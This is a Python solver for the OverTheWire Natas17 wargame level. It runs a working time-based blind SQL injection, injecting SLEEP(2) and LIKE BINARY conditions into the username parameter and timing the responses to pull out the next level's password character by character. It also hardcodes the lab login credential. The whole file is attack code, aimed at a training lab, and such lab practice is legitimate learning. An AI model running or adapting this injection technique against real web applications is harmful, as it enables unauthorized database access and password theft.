import requests, string
from time import time
base_url ="http://natas17.natas.labs.overthewire.org/index.php?username="
characters = ''.join([string.ascii_letters,string.digits])

username="natas17"
password="XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"

done=False
passwd='D'
passwd_len = len(passwd)
char = ''

def check(query):
    start = time()
    resp = requests.get(base_url + query, auth=(username, password))
    duration = time() - start
    print(' ',char, '---', duration)
    if(duration > 2):
        print(resp.text)
        return True
    return False

chars = 'agknoquvwxDEFGJLNPQUVZ468'
# for c in characters:
#     query=f'natas18" AND password LIKE BINARY "%{c}%" AND SLEEP(2) AND "a"="a&debug'
#     if check(query):
#         chars.append(c)
#         print("".join(chars))

while not done:
    for c in chars:
        char = c
        query=f'natas18" AND password LIKE BINARY "%{passwd}{c}%" AND SLEEP(2) AND "a"="a&debug'
        alt_query=f'natas18" AND password LIKE BINARY "%{c}{passwd}%" AND SLEEP(2) AND "a"="a&debug'
        if(check(query)):
            passwd = passwd + c
        elif(check(alt_query)):
            passwd = c + passwd

        if(check(f'natas18" AND password LIKE BINARY "{passwd}" AND SLEEP(2) AND "a"="a&debug')):
            done = True
        elif(passwd_len != len(passwd)):
            passwd_len = len(passwd)
            print('\t', passwd)

print(f"PASSWORD: {passwd}")
# check(f'natas16" and password LIKE BINARY "{passwd}&debug')
